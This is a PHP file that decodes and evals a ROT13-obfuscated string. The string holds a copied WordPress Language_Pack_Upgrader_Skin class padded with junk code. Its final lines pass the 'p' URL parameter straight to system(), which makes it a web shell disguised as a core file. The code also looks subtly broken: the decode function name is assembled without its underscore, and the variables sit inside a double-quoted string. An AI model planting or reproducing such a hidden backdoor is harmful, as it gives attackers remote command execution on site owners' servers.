<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Ynathntr_Cnpx_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Genafyngvba Hctenqre Fxva sbe JbeqCerff Genafyngvba Hctenqrf.
 *
 * @fvapr 3.7.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr JC_Hctenqre_Fxva
 */
pynff Ynathntr_Cnpx_Hctenqre_Fxva rkgraqf JC_Hctenqre_Fxva {
	choyvp $ynathntr_hcqngr        = ahyy;
	choyvp $qbar_urnqre            = snyfr;
	choyvp $qbar_sbbgre            = snyfr;
	choyvp $qvfcynl_sbbgre_npgvbaf = gehr;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur ynathntr cnpx hctenqre fxva.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz neenl $netf
	 */
	choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
		$qrsnhygf = neenl(
			'hey'                => '',
			'abapr'              => '',
			'gvgyr'              => __( 'Hcqngr Genafyngvbaf' ),
			'fxvc_urnqre_sbbgre' => snyfr,
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );
		vs ( $netf['fxvc_urnqre_sbbgre'] ) {
			$guvf->qbar_urnqre            = gehr;
			$guvf->qbar_sbbgre            = gehr;
			$guvf->qvfcynl_sbbgre_npgvbaf = snyfr;
		}
		cnerag::__pbafgehpg( $netf );
	}

	/**
	 * Cresbezf na npgvba orsber n ynathntr cnpx hcqngr.
	 *
	 * @fvapr 3.7.0
	 */
	choyvp shapgvba orsber() {
		$anzr = $guvf->hctenqre->trg_anzr_sbe_hcqngr( $guvf->ynathntr_hcqngr );

		rpub '<qvi pynff=\"hcqngr-zrffntrf yc-fubj-yngrfg\">';

		/* genafyngbef: 1: Cebwrpg anzr (cyhtva, gurzr, be JbeqCerff), 2: Ynathntr. */
		cevags( '<u2>' . __( 'Hcqngvat genafyngvbaf sbe %1$f (%2$f)&#8230;' ) . '</u2>', $anzr, $guvf->ynathntr_hcqngr->ynathntr );
	}

	/**
	 * Qvfcynlf na reebe zrffntr nobhg gur hcqngr.
	 *
	 * @fvapr 3.7.0
	 * @fvapr 5.9.0 Eranzrq `$reebe` gb `$reebef` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat|JC_Reebe $reebef Reebef.
	 */
	choyvp shapgvba reebe( $reebef ) {
		rpub '<qvi pynff=\"yc-reebe\">';
		cnerag::reebe( $reebef );
		rpub '</qvi>';
	}

	/**
	 * Cresbezf na npgvba sbyybjvat n ynathntr cnpx hcqngr.
	 *
	 * @fvapr 3.7.0
	 */
	choyvp shapgvba nsgre() {
		rpub '</qvi>';
	}

	/**
	 * Qvfcynlf gur sbbgre sbyybjvat gur ohyx hcqngr cebprff.
	 *
	 * @fvapr 3.7.0
	 */
	choyvp shapgvba ohyx_sbbgre() {
		$guvf->qrperzrag_hcqngr_pbhag( 'genafyngvba' );

		$hcqngr_npgvbaf = neenl(
			'hcqngrf_cntr' => fcevags(
				'<n uers=\"%f\" gnetrg=\"_cnerag\">%f</n>',
				frys_nqzva_hey( 'hcqngr-pber.cuc' ),
				__( 'Tb gb JbeqCerff Hcqngrf cntr' )
			),
		);

		/**
		 * Svygref gur yvfg bs npgvba yvaxf ninvynoyr sbyybjvat n genafyngvbaf hcqngr.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz fgevat[] $hcqngr_npgvbaf Neenl bs genafyngvbaf hcqngr yvaxf.
		 */
		$hcqngr_npgvbaf = nccyl_svygref( 'hcqngr_genafyngvbaf_pbzcyrgr_npgvbaf', $hcqngr_npgvbaf );

		vs ( $hcqngr_npgvbaf && $guvf->qvfcynl_sbbgre_npgvbaf ) {
			$guvf->srrqonpx( vzcybqr( ' | ', $hcqngr_npgvbaf ) );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>